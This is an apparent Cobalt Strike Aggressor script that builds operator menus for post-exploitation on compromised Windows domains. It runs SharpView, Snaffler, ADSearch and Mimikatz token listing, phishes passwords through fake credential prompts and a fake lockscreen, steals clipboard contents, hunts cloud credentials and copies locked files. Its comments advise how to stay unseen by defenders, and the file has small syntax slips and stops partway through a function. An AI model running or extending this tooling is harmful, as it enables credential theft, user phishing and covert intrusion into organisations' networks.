    ###################################		         		###################################
#######################################		         		#######################################
  #####################################		         		#####################################
           ############################		  Menus 		############################

#################################################

#   Local Admin Access

#################################################
menu "Local Admin Access" {

item "Find Admin Access - Sneaky  - T1033"{
	local('$bid');
		foreach $bid ($1){
			sneakyadmin($bid);
		}
	}
			
item "Find Admin Access - Loud  - T1033"{
	local('$bid');
		foreach $bid ($1){
			loudadmin($bid);
		}
	}
			
		item "Find Admin and Share Access - Sneaky  - T1033"{
			local('$bid');
				foreach $bid ($1){
					sneakyshare($bid);
				}
			}
			
		item "Find Admin and Share Access - Sneaky-ISH  - T1033"{
			local('$bid');
				foreach $bid ($1){
					sneakish($bid);
				}
			}
			
		item "Find Admin and Share Access - LOUD  - T1033"{
			local('$bid');
				foreach $bid ($1){
					loudshare($bid);
				}
			}
			
		item "Find Admin - Sniper Mode  - T1033"{
			local('$bid');
				foreach $bid ($1){
					snipeaccess($bid);
				}
			}

}
#################################################

#   Domain Enumeration

#################################################
menu "AD and Domain Enumeration"
{


menu "SharpView (drops identifiable files to disk)" {
#Domain Name
item "List Domain (SharpView)"{
	local('$bid');
		foreach $bid ($1){
			getnetdomain($bid);
			}
		}

#Get Domain Security Identifier (SID) (SharpView)
item "List Domain SID (SharpView)"{
	local('$bid');
		foreach $bid ($1){
			getdomainsid($bid);
			}
		}


#Get Domain Security Identifier (SID)
item "List Domain SID (Specify Domain) (SharpView)"{
	local('$bid');
		foreach $bid ($1){
			getdomainsidspec($bid);
			}
		}
		
		
#################################################

#   Domain/Forest Enumeration

#################################################


#Get Net Forest
		item "List Domains of Forest  - T1"{
			local('$bid');
				foreach $bid ($1){
					getnetforest($bid);
					}
				}
				
#Get Net Forest Domain
		item "Enumerate All Domains for The Current Forest  - T1482"{
			local('$bid');
				foreach $bid ($1){
					getnetforestdomain($bid);
					}
				}		
				
#Get Net Domain Trust
		item "Enumerate Domain Trust relationships  - T1482"{
			local('$bid');
				foreach $bid ($1){
					getnetdomaintrust($bid);
					}
				}				
				
#Get Net Forest Trust
		item "Enumerate Forest Trusts Of Current Domain  - T1482"{
			local('$bid');
				foreach $bid ($1){
					getnetforesttrust($bid);
					}
				}

#################################################

#   Domain User Enumeration

#################################################

#List Admins in Domain
					
	item "List Admins in Domain  - T1087"{
		local('$bid');
			foreach $bid ($1){
				getnetuseradmin($bid);
			}
		}
menu "Find User Location"
{

#Find User Location By Machine Name
					
item "Find User Location By Machine Name  - T1033"{
	local('$bid');
		foreach $bid ($1){
			finduserlocationmachine($bid);
		}
	}

#Find User Location by Username
item "Find User Location by Username  - T1033"{
	local('$bid');
		foreach $bid ($1){
			finduserlocationuser($bid);
		}
	}

#Find User Location by Machine and Username
#item "Find User Location by Machine and Username  - T1033"{
#	local('$bid');
#		foreach $bid ($1){
#			getnetuseradmin($bid);
#		}
#	}

}

#################################################

#   Domain Computer Object Enumeration

#################################################

	
#List computers in Domain
					
		item "List Computers  - T1018"{
			local('$bid');
				foreach $bid ($1){
					getdomaincomputer($bid);
				}
			}
		
#List computers in Domain by specifying Domain
					
		item "List Computers In Specified Domain  - T1018"{
			local('$bid');
				foreach $bid ($1){
					getnetcomputerdom($bid);
				}
			}		

#################################################

#   Domain Group Enumeration

#################################################

########List Groups in Domain##################
		item "List Groups in Domain"{
			local('$bid');
				foreach $bid ($1){
					getnetgroup($bid);
				}
			}
		
		item "Enterprise Admin"{
			local('$bid');
				foreach $bid ($1){
					getnetgroupenterpriseadmin($bid);
				}
			}
			
		item "Domain Admin"{
			local('$bid');
				foreach $bid ($1){
					getnetgroupdomainadmin($bid);
				}
			}					
			
		item "Administrator"{
			local('$bid');
				foreach $bid ($1){
					getnetgroupadministrator($bid);
				}
			}


        } #End of SharpView Menu
	
menu "ADSearch" {


item "List Groups"{

    local('$bid');
        foreach $bid ($1){
            adsearchlistgroups($bid);
      }
   }  #End Item 
   
item "List Users"{

    local('$bid');
        foreach $bid ($1){
            adsearchlistusers($bid);
      }
   }  #End Item 
   
   
item "List SPNs"{

    local('$bid');
        foreach $bid ($1){
            adsearchlistspns($bid);
      }
   }  #End Item 
   
   
item "List Domain Admins"{

    local('$bid');
        foreach $bid ($1){
            adsearchlistdomainadmins($bid);
      }
    }  #End Item 

sub adsearchlistgroups{
bexecute_assembly($1, script_resource('/exe/ADSearch.exe'), "--groups");
}

sub adsearchlistusers{
bexecute_assembly($1, script_resource('/exe/ADSearch.exe'), "--users");
}

sub adsearchlistspns{
bexecute_assembly($1, script_resource('/exe/ADSearch.exe'), "--spns");
}

sub adsearchlistdomainadmins{
bexecute_assembly($1, script_resource('/exe/ADSearch.exe'), "--domain-admins");
}
 

} #End of ADSearch Menu
    
    } #End of AD Menu



################################################

#Remote WMI Enumeration

################################################

menu "Remote Computer Enumeration (WMI)" {
		
		
		item "List Remote Processes on Computer"{
			local('$bid');
				foreach $bid ($1){
					remoteprocessoncomputer($bid);
				}
			}

		item "List Remote Services on Computer"{
			local('$bid');
				foreach $bid ($1){
					remoteserviceoncomputer($bid);
				}
			}

		item "List Remote Anti-Virus on Computer w/alternate creds"{
			local('$bid');
				foreach $bid ($1){
					remoteantivirusoncomputerwithpassword($bid);
				}
			}
			
		item "List Remote Anti-Virus on Computer w/current creds"{
			local('$bid');
				foreach $bid ($1){
					remoteantivirusoncomputerwithcurrentpassword($bid);
				}
			}			
			
		item "List Logon Events for a User"{
			local('$bid');
				foreach $bid ($1){
					querylogoneventsforuser($bid);
				}
			}
			
		} #End Menu

#Function to Query Remote Processes
sub remoteprocessoncomputer{
    $bid = $1;
    $dialog = dialog("Query Remote Processes", %(computername => "", username => "", password => "", execmethod => "Execute-Assembly"), lambda({
        $cmdargs = "";
        $cmdargs = "ListRemoteProcess $3['computername'] $3['username'] $3['password']";
        if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Querying Remote Processes');
            bexecute_assembly($bid, script_resource('/exe/WMIUtility.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "Query Remote Processes");
    drow_text($dialog, "computername",  "Please Enter the Computer Name:");
    drow_text($dialog, "username",  "Please Enter the UserName:");
    drow_text($dialog, "password",  "Please Enter the a Password:");
    dbutton_action($dialog, "Execute");
    dialog_show($dialog);
}

#Function to Query Remote Services
sub remoteserviceoncomputer{
    $bid = $1;
    $dialog = dialog("Query Remote Services", %(computername => "", username => "", password => "", execmethod => "Execute-Assembly"), lambda({
        $cmdargs = "";
        $cmdargs = "ListRemoteService $3['computername'] $3['username'] $3['password']";
        if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Querying Remote Services');
            bexecute_assembly($bid, script_resource('/exe/WMIUtility.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "Query Remote Services w/alternate creds");
    drow_text($dialog, "computername",  "Please Enter the computername:");
    drow_text($dialog, "username",  "Please Enter a username:");
    drow_text($dialog, "password",  "Please Enter a cleartext password:");
    dbutton_action($dialog, "Execute");
    dialog_show($dialog);
}

#Function to Query Remote Antivirus
sub remoteantivirusoncomputerwithpassword{
    $bid = $1;
    $dialog = dialog("Query Remote AV", %(computername => "", username => "", password => "", execmethod => "Execute-Assembly"), lambda({
        $cmdargs = "";
        $cmdargs = "Get-AV $3['computername'] $3['username'] $3['password']";
        if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Querying Remote Anti-Virus');
            bexecute_assembly($bid, script_resource('/exe/WMIUtility.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "Query Remote AV w/alternate creds");
    drow_text($dialog, "computername",  "Please Enter the computername:");
    drow_text($dialog, "username",  "Please Enter a username:");
    drow_text($dialog, "password",  "Please Enter a cleartext password:");
    dbutton_action($dialog, "Execute");
    dialog_show($dialog);
}


#Function to Query Logon Events for a User
sub querylogoneventsforuser{
    $bid = $1;
    $dialog = dialog("Query Logon Events for user", %(samaccountname => "", domaincontroller => "", username => "", password => "", execmethod => "Execute-Assembly"), lambda({
        $cmdargs = "";
        $cmdargs = "Get-EventForUser $3['samaccountname'] $3['domaincontroller'] $3['username']" $3['password'];
        if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Querying Logon Events');
            bexecute_assembly($bid, script_resource('/exe/WMIUtility.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "Query Logon Events for User");
    drow_text($dialog, "samaccountname",  "Please Enter the samaccountname:");
    drow_text($dialog, "domaincontroller",  "Please Enter the Domain Controller:");
    drow_text($dialog, "username",  "Please Enter a Username:");
    drow_text($dialog, "password",  "Please Enter a Password:");
    dbutton_action($dialog, "Execute");
    dialog_show($dialog);
}

#Function to query remote AV
sub remoteantivirusoncomputerwithcurrentpassword{
prompt_text("Enter Computer Name", "", lambda({
bexecute_assembly($bids, script_resource("/exe/WMIUtility.exe"), "Get-AV $1");
}, $bids => $1));
}

#################################################

#   ACL Checks

#################################################

menu "ACL Checks"
{

#Get ACLs associated with a specified object
		item "ACLs associated with User Object"{
			local('$bid');
				foreach $bid ($1){
					getobjacl($bid);
					}
				}
}
#################################################

#   File and Share Enumeration

#################################################
menu "File And Share Enumeration"
{

#################################################
#   Snaffler - SubMenu
#################################################
menu "Snaffler"{


########################
#Find All Shares
########################
item "Display All Available Shares (Noisy) - T1135"{
    local('$bid');
        foreach $bid ($1){
            findallshares($bid);
      }
   }

########################
#Find Shares - Specify Domain
########################
item "Display All Available Shares Based On Domain - T1135"{

    local('$bid');
        foreach $bid ($1){
            finddomainshares($bid);
      }
   }
########################
#Find Shares - Specify DC
########################
item "Display All Available Shares Based On DC - T1135"{

    local('$bid');
        foreach $bid ($1){
            finddomaincontrollershares($bid);
      }
   }
########################
#Find Shares - Specify DC & Domain
########################
item "Display All Available Shares Based On DC And Domain - T1135"{

    local('$bid');
        foreach $bid ($1){
            finddomaincontrolleranddomainshares($bid);
      }
   }
########################
#Find Shares - User Enumeration All
########################
item "Display All Available User Shares (Noisy) - T1135"{

    local('$bid');
        foreach $bid ($1){
            finduserallshares($bid);
      }
   }
########################
#Find Shares - User Enumeration & Specify Domain
########################
item "Display All Available User Shares Based On Domain - T1135"{

    local('$bid');
        foreach $bid ($1){
            finduserdomainshares($bid);
      }
   }
########################
#Find Shares - User Enumeration Specify Domain Controller
########################
item "Display All User Available Shares Based On Domain Controller - T1135"{

    local('$bid');
        foreach $bid ($1){
            finddomaincontrollershares($bid);
      }
   }
########################
#Find Shares - User Enumeration Specify Domain Controller & Domain
########################
item "Display All Available Shares Based On Domain Controller & Domain - T1135"{

    local('$bid');
        foreach $bid ($1){
            finduserdomaincontrolleranddomainshares($bid);
      }
   }
} #End Snaffler Menu


item "Find Shares using SharpShares"{
	local('$bid');
		foreach $bid ($1){
			sharpshares($bid);
			}
		}

item "Find Shares using SharpShares - Not OPSEC"{
	local('$bid');
		foreach $bid ($1){
			sharpsharesmod($bid);
			}
		}
		
item "Find Files using SharpFiles - Not OPSEC"{
	local('$bid');
		foreach $bid ($1){
			sharpfiles($bid);
			}
		}

#Find Cloud Credential Files
item "Find Cloud Creds"{
	local('$bid');
		foreach $bid ($1){
			cloudcreds($bid);
			}
		}

#Find Domain Share
item "Find Domain Shares  - T1135"{
	local('$bid');
		foreach $bid ($1){
			finddomainshare($bid);
		}
	}
				
#Find Interesting Domain Shares 
item "Find Interesting Domain Shares  - T1135"{
	local('$bid');
		foreach $bid ($1){
			findinterestingdomainsharefile($bid);
		}
	}

#############################
#SharpDir - Search For Files
#############################
item "SharpDir - Search For Files"{

    local('$bid');
        foreach $bid ($1){
            sharpdircustom($bid);
      }
   }

#Find File Servers 
item "Find File Servers  - T1083"{
	local('$bid');
		foreach $bid ($1){
			getnetfileserver($bid);
		}
	}
	
menu "LockLess"{
item "Find All Locked Files And Process Handles - T1135"{
    local('$bid');
        foreach $bid ($1){
            locklessall($bid);
      }
   }

item "Find Process Handles For Specific File - T1135"{
    local('$bid');
        foreach $bid ($1){
            locklessfindproc($bid);
      }
   }   
   
item "Copy Locked File By Filename - T1135"{
    local('$bid');
        foreach $bid ($1){
            locklesscopy($bid);
      }
   }   

item "Copy Locked File By Filename and Process ID - T1135"{
    local('$bid');
        foreach $bid ($1){
            locklesscopypid($bid);
      }
   }      
}	
}


#################################################

#   Mimikatz: Token Enumeration

#################################################
menu "Mimikatz: Token Enumeration"
{
#List All Tokens

item "List Tokens"{
	local('$bid');
		foreach $bid ($1){
			tokenlist($bid);
		}
	}
			
#List Admin Tokens
item "List Admin Tokens"{
	local('$bid');
		foreach $bid ($1){
			listadmintokens($bid);
		}			
	}


#List Domain Admin Tokens
item "List Domain Admin Tokens"{
	local('$bid');
		foreach $bid ($1){
			listdatokens($bid);
		}
	}

#List Enterprise Admin Tokens

item "List Enterprise Admin Tokens"{
	local('$bid');
		foreach $bid ($1){
			listeatokens($bid);
		}
	}
}
#################################################

#   Phishing Users

#################################################
menu "Phishing Users"
{
#Run CredPhisher
					
	item "Prompt for Username and Password  - T1141"{
		local('$bid');
			foreach $bid ($1){
				credphisher($bid);
			}
		}
		
#Run Custom CredPhisher	
	item "Prompt Custom Message  - T1141"{
			local('$bid');
				foreach $bid ($1){
					custcredphisher($bid);
				}
			}
			
#Run Lock Screen Phishing Exploit
					
	item "Show Lockscreen to Phish Password  - T1141"{
		local('$bid');
			foreach $bid ($1){
				lockscreen($bid);
			}
		}
		
}

#################################################

#   Screenshots

#################################################
item "Screenshots"{
	local('$bid');
		foreach $bid ($1){
			screenshots($bid);
		}
	}
	

#################################################
#   Clipboard Stealer By jfmaesa
#################################################

item "Retrieve Clipboard Contents"{
	local('$bid');
		foreach $bid ($1){
			getclippy($bid);
		}
	}

#################################################

#   Email Keyword Search

#################################################

item "Outlook Email Keyword Search"{
	local('$bid');
		foreach $bid ($1){
			getemails($bid);
		}
	}

#################################################

#   Registry Strikes Back

#################################################

item "Registry Strikes Back (Export .reg files from registry)"{
	local('$bid');
		foreach $bid ($1){
			regsb($bid);
		}
	}

#################################################

#   EDR Query

#################################################


#################################################

#   Process Listing

#################################################
menu "Process Listing"
{
item "Mimikatz List Processes  - T1057"{
	local ('$bid');
		foreach $bid ($1){
			mimilistprocesses($bid);
		}
	}

item "Get Processes (WMI)  - T1057"{
	local ('$bid');
		foreach $bid ($1){
			getwmiprocesses($bid);
		}
	}
	
item "Get Remote Processes (WMI)  - T1057"{
	local ('$bid');
		foreach $bid ($1){
			getremotewmiprocesses($bid);
		}
	}	
}

#################################################
##
##   Service Enumeration Menu
##
#################################################

menu "Service Enumeration"{

# Enumerate Services
item "Service Enumeration - Current Computer - T1046"{

    local('$bid');
        foreach $bid ($1){
            serviceenumerationlocalhost($bid);
      }
   }


# Enumerate Remote Services
item "Service Enumeration - Remote Computer - T1046"{

    local('$bid');
        foreach $bid ($1){
            getremoteservices($bid);
      }
   }

} #End Menu Popup



#################################################

#   SQL Database

#################################################
menu "SQL Database"{

#PowerUpSQL
menu "PowerUpSQL"
{
#List Cached Credentials
item "Initialize PowerUpSQL (DO THIS FIRST)"{
		local('$bid');
				foreach $bid ($1){
					psqlinit($bid);
				}
			}
			
#Discover Local SQL Server Instances
item "Discover Local SQL Server Instances"{
		local('$bid');
				foreach $bid ($1){
					psqldiscloc($bid);
				}
			}

#PowerUpSQL Discover Domain SQL Servers
item "Discover Domain SQL Server Instances"{
		local('$bid');
				foreach $bid ($1){
					psqldiscdom($bid);
				}
			}

#PowerUpSQL Discover Domain SQL Servers Information	
item "Discover Domain SQL Server Information"{
		local('$bid');
				foreach $bid ($1){
					psqldiscdominfo($bid);
				}
			}

#PowerUpSQL Discover Domain SQL Servers - Check Availability
item "Discover Domain SQL Server Availability"{
		local('$bid');
				foreach $bid ($1){
					psqldiscdomcheck($bid);
				}
			}

#PowerUpSQL Find Links To Remote Servers			
item "Find Links To Remote Servers"{
		local('$bid');
				foreach $bid ($1){
					psqlfindrem($bid);
				}
			}

#PowerUpSQL Enumerate Database Links		
item "Enumerate Database Links"{
		local('$bid');
				foreach $bid ($1){
					psqlfindrem($bid);
				}
			}
}

#DAFT
menu "DAFT"
{


}
}







    ###################################		         		###################################
#######################################		         		#######################################
  #####################################		         		#####################################
           ############################		 Functions 		############################

#################################################

#   Local Admin Access

#################################################
sub sneakyadmin{
bexecute_assembly($1, script_resource('../exe/SharpView.exe'), "Find-LocalAdminAccess -Threads 1 -Jitter 1 -Delay 20");
}
sub loudadmin{
bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Find-LocalAdminAccess");
}
sub sneakyshare{
bexecute_assembly($1, script_resource('../exe/SharpView.exe'), "Find-LocalAdminAccess -Threads 1 -Jitter 1 -CheckShareAccess -Delay 20");
}
sub sneakish{
bexecute_assembly($1, script_resource('../exe/SharpView.exe'), "Find-LocalAdminAccess -Threads 1 -Jitter 1 -CheckShareAccess -Delay 7");
}
sub loudshare{
bexecute_assembly($1, script_resource('../exe/SharpView.exe'), "Find-LocalAdminAccess -CheckShareAccess");
}
v
sub sweetpotato{
bexecute_assembly($1, script_resource('exe/SweetPotato.exe'));
}
sub snipeaccess{
prompt_text("Computer Name - FQDN)", "", lambda({
bexecute_assembly($bids, script_resource('../exe/SharpView.exe'), "Find-LocalAdminAccess -Threads 1 -Jitter 1 -CheckShareAccess -ComputerName $1");
}, $bids => $1));
}			

#################################################

#   Domain Enumeration

#################################################

#SharpView Get NetDomain
sub getnetdomain{
bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetDomain");
}

# SharpView get current domain's SID
sub getdomainsid{
bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-DomainSID");
}

# SharpView get specified domain's SID
sub getdomainsidspec{
prompt_text("Please Specify Domain", "", lambda({
bexecute_assembly($bids, script_resource('../exe/SharpView.exe'), "Get-DomainSID -Domain $1");
}, $bids => $1));
}
#################################################

#   Domain User Enumeration

#################################################

# SharpView List Admin Users
sub getnetuseradmin{
bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetUser -AdminCount");
}

# SharpView Find User Locations By Machine Name
sub finduserlocationmachine{
prompt_text("Machine Name - (FQDN)", "", lambda({
bexecute_assembly($bids, script_resource('/exe/SharpView.exe'), "Find-DomainUserLocation -ComputerName $1");
}, $bids => $1));
}

# SharpView Find User Locations by Username
sub finduserlocationuser{
prompt_text("Enter Username", "", lambda({
bexecute_assembly($bids, script_resource('/exe/SharpView.exe'), "Find-DomainUserLocation -UserIdentity $1 -CheckAccess");
}, $bids => $1));
}

#################################################

#   Domain Computer Object Enumeration

#################################################

# SharpView Get Domain Computers
sub getdomaincomputer{
bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-DomainComputer");
}

# Sharpview Get Net Computer by Domain
sub getnetcomputerdom{
prompt_text("Specifiy a Domain (FQDN)", "", lambda({
bexecute_assembly($bids, script_resource('/exe/SharpView.exe'), "Get-NetComputer -Domain $1");
}, $bids => $1));
}


#################################################

#   Domain Group Enumeration

#################################################			

#SharpView list Groups
sub getnetgroup{
bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup');
}

# SharpView list Enterprise Admins
sub getnetgroupenterpriseadmin{
bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Enterprise Admins" -Recursive');
}

# SharpView list Domain Admins
sub getnetgroupdomainadmin{
bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Domain Admins" -Recursive');
}

# SharpView list Administrators group
sub getnetgroupadministrator{
bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Administrators" -Recursive');
}			
			
#################################################

#   Domain/Forest Enumeration

#################################################

# SharpView Get-NetForest
sub getnetforest{
bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetForest");
}

# SharpView Get-NetForestTrust
sub getnetforesttrust{
bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetForestTrust");
}

# SharpView Get-NetDomainTrust
sub getnetdomaintrust{
bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetDomainTrust");
}

# SharpView Get-NetForestDomain
sub getnetforestdomain{
bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetForestDomain");
}

#################################################

#   ACL Checks

#################################################

# SharpView Get ACL Object
sub getobjacl{
prompt_text("Sam Account Name", "", lambda({
bexecute_assembly($bids, script_resource('/exe/SharpView.exe'), "Get-ObjectAcl -SamAccountName $1 -ResolveGUIDs");
}, $bids => $1));
}

#################################################

#   File/Share Enumeration

#################################################


#################################################
#   Snaffler
#################################################
sub findallshares{
bexecute_assembly($1, script_resource("/exe/Snaffler.exe"), "-s -j 75 -v data");
}

sub finddomainshares{
prompt_text("Insert Domain Name", "", lambda({
bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -j 75 -d $1 -v data");
}, $bids => $1));
}

sub finddomaincontrollershares{
prompt_text("Insert DomainController", "", lambda({
bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -j 75 -c $1 -v data");
}, $bids => $1));
}

sub finddomaincontrolleranddomainshares{
    $bid = $1;
    $dialog = dialog("Show Domain and DC Shares", %(dom => "", dc => "", execmethod => "Execute-Assembly"), lambda({
       $cmdargs = "";
		$cmdargs = "-d $3['dom'] -c $3['dc']";
        if ($3["execmethod"] eq "Execute-Assembly"){         
            bexecute_assembly($bid, script_resource('/exe/Snaffler.exe'), '-s -i -j 75 '.$cmdargs.''" -v data");
        }
    }));
    dialog_description($dialog, "Show Domain and DC Shares");
    drow_text($dialog, "dom",  "Please Enter Domain");
    drow_text($dialog, "dc",  "Please Enter DC FQDN");
    dbutton_action($dialog, "Run");
	dialog_show($dialog);
}

#prompt_text("Insert Domain Name", "", lambda({
#bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -j 75 -d $1 -v data");
#}, $bids => $1));
#}

sub finduserallshares{
bexecute_assembly($1, script_resource("/exe/Snaffler.exe"), "-s -u -j 75 -v data");
}

sub finduserdomainshares{
prompt_text("Insert Domain Name", "", lambda({
bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -u -j 75 -d $1 -v data");
}, $bids => $1));
}

sub finduserdomaincontrollershares{
prompt_text("Insert DomanController", "", lambda({
bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -u -j 75 -c $1 -v data");
}, $bids => $1));
}

#sub finddomaincontrolleranddomainshares{
#prompt_text("Insert Domain Name", "", lambda({
#bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -u -j 75 -d $1 -v data");
#}, $bids => $1));
#}

##Share Only Enum
#"Snaffler.exe -s -j 75 -v data" - Will be at top of menu, this will show all the things and will be noisy
#Snaffler.exe -s -j 75 -d "$DOMAIN" -v data Will be second item menu, will need to pop up and have user enter domain name
#Snaffler.exe -s -j 75 -c "$DOMAINCONTROLLER" -v data Specify which domain controller (OPSEC) - try not to hit Azure or ATP DC's - PDC is preferred
#Snaffler.exe -s -j 75 -c "$DOMAINCONTROLLER" -d "$DOMAIN" -v data Specify which domain controller (OPSEC) and Domain - try not to hit Azure or ATP DC's - PDC is preferred
##User Enum
#Snaffler.exe -s -u -j 75-v data" - Will be at top of menu, this will show all the things and will be noisy (Added user switch)
#Snaffler.exe -s -u -j 75 -d "$DOMAIN" -v data Will be second item menu, will need to pop up and have user enter domain name (Added user switch)
#Snaffler.exe -s -u -j 75 -c "$DOMAINCONTROLLER" -v data Specify which domain controller (OPSEC) - try not to hit Azure or ATP DC's - PDC is preferred (Added user switch)
#Snaffler.exe -s -u -j 75 -c "$DOMAINCONTROLLER" -d "$DOMAIN" -v data Specify which domain controller (OPSEC) and Domain - try not to hit Azure or ATP DC's - PDC is preferred (Added user switch)


#SharpShares
sub sharpshares{
bexecute_assembly($1, script_resource('/exe/SharpShares.exe'), "shares");
}

#SharpShares w/SharpFiles
sub sharpsharesmod{
bexecute_assembly($1, script_resource('/exe/sharpshares.exe'));
}

#SharpFiles
sub sharpfiles{
bexecute_assembly($1, script_resource('/exe/sharpfiles.exe'));
}

# Cloud Creds
sub cloudcreds{
bexecute_assembly($1, script_resource('/exe/SharpCloud.exe'), "all");
}

# SharpView Find Domain Share
sub finddomainshare{
bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Find-DomainShare");
}

# Cloud Creds
sub cloudcreds{
bexecute_assembly($1, script_resource('/exe/SharpCloud.exe'), "all");
}

# SharpView Find Interesting Domain Shares
sub findinterestingdomainsharefile{
bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Find-InterestingDomainShareFile");
}

#############################
#SharpDir - Search For Files
#############################
sub sharpdircustom{
    $bid = $1;
    $dialog = dialog("Show Domain and DC Shares", %(path => "", file => "", execmethod => "Execute-Assembly"), lambda({
       $cmdargs = "";
		$cmdargs = "$3['path'] $3['file']";
        if ($3["execmethod"] eq "Execute-Assembly"){         
            bexecute_assembly($bid, script_resource('/exe/SharDir.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "Search For Files Using SharpDir");
    drow_text($dialog, "path",  "Please Enter A Path: ");
    drow_text($dialog, "file",  "Please Enter A FileName/Wildcard: ");
    dbutton_action($dialog, "Run");
	dialog_show($dialog);
}

# SharpView Find File Servers
sub getnetfileserver{
bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetFileServer");
}


#################################################
#   LockLess - SubMenu
#################################################

#Find All Locked Files And Process Handles 
sub locklessall{
bexecute_assembly($1, script_resource('/exe/LockLess.exe'), "all");
}
   
sub locklessfindproc{
 $bid = $1;
    $dialog = dialog("LockLess: Find Which Process Has Handle On File", %(file => "", execmethod => "Execute-Assembly"), lambda({
        $cmdargs = "";
        $cmdargs = "$3['file']";
        if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Finding Process Handle....');
            bexecute_assembly($bid, script_resource('exe/LockLess.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "Find Which Process Has Handle On File");
    drow_text($dialog, "file",  "Please Enter A FileName:");
    dbutton_action($dialog, "Execute");
    dialog_show($dialog);

}

sub locklesscopy{
 $bid = $1;
    $dialog = dialog("LockLess: Copy Locked File By FileName", %(file => "", dest => "", execmethod => "Execute-Assembly"), lambda({
        $cmdargs = "";
        $cmdargs = "$3['file'] /copy:$3['dest']";
        if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Copying File....');
            bexecute_assembly($bid, script_resource('exe/LockLess.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "Copy Locked File By FileName");
    drow_text($dialog, "file",  "Please Enter A FileName:");
    drow_text($dialog, "dest",  "Please Enter The Destination To Copy The File:");
    dbutton_action($dialog, "Execute");
    dialog_show($dialog);

}    
   
sub locklesscopypid{
 $bid = $1;
    $dialog = dialog("LockLess: Copy Locked File By FileName And Process ID", %(file => "", proc => "", dest => "", execmethod => "Execute-Assembly"), lambda({
        $cmdargs = "";
        $cmdargs = "$3['file'] /process:$3['proc'] /copy:$3['dest']";
        if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Copying File....');
            bexecute_assembly($bid, script_resource('exe/LockLess.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "Enumerate Remote Hosts with Seatbelt");
    drow_text($dialog, "file",  "Please Enter A FileName:");
    drow_text($dialog, "proc",  "Please Enter A Process ID:");
    drow_text($dialog, "dest",  "Please Enter The Destination To Copy The File:");
    dbutton_action($dialog, "Execute");
    dialog_show($dialog);

}
#################################################

#   Mimikatz: Token Enumeration

#################################################
# Mimikatz List Tokens
sub tokenlist{
bmimikatz($1, "token::list");
}

# Mimikatz List Admin Tokens
sub listadmintokens{
bmimikatz($1, "token::list /admin");
}

#Mimikatz List Domain Admin Tokens
sub listdatokens{
bmimikatz($1, "token::list /domainadmin");
}

#Mimikatz List Enterprise Admin Tokens
sub listeatokens{
bmimikatz($1, "token::list /enterpriseadmin");
}

#################################################

#   Phishing Users

#################################################

# Phish Users with small pop up box
sub credphisher{
bexecute_assembly($1, script_resource('/exe/CredPhisher.exe'), '"Please Enter Your Password"');
}

# Phish Users with custom pop up box
sub custcredphisher{
 $bid = $1;
    $dialog = dialog("LockLess: Find Which Process Has Handle On File", %(popu => "", execmethod => "Execute-Assembly"), lambda({
        $cmdargs = "";
        $cmdargs = "\"$3['popu']\"";
        if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Finding Process Handle....');
            bexecute_assembly($bid, script_resource('exe/CredPhisher.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "Custom Cred Phisher Prompt");
    drow_text($dialog, "popu",  "Please Enter A Custom Pop Up Message:");
    dbutton_action($dialog, "Execute");
    dialog_show($dialog);

}

# Phish Users with fake lockscreen
sub lockscreen{
bexecute_assembly($1, script_resource('/exe/WindowsFormsApp9.exe'));
}

#################################################

#   Screenshot

#################################################

sub screenshots{
 $bid = $1;
    $dialog = dialog("Screenshots", %(pid => "", arc => "", time => "", execmethod => "Execute-Assembly"), lambda({
        $cmdargs = "";
        $cmdargs = "$3['pid'] $3['arc'] $3['time']";
        if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Taking Screenshots....');
            bscreenshot($bid, $cmdargs);
        }
    }));
    dialog_description($dialog, "Take Screenshots");
    drow_text($dialog, "pid",  "Please Enter A Process ID:");
    drow_combobox($dialog, "arc",  "Please Select The Proper Architecture:", @("x64", "x86"));
    drow_text($dialog, "time",  "How Many Seconds Would You Like To Take Screenshots?:");
    dbutton_action($dialog, "Execute");
    dialog_show($dialog);

}


#################################################
#   Clipboard Stealer By jfmaesa
#################################################
sub getclippy{
bexecute_assembly($1, script_resource("/exe/Clippy-B.exe"),"--interval=10 --monitor=4");
}

#################################################

#   Email Keyword Search

#################################################

sub getemails{
prompt_text("Enter Keyword:", "", lambda({
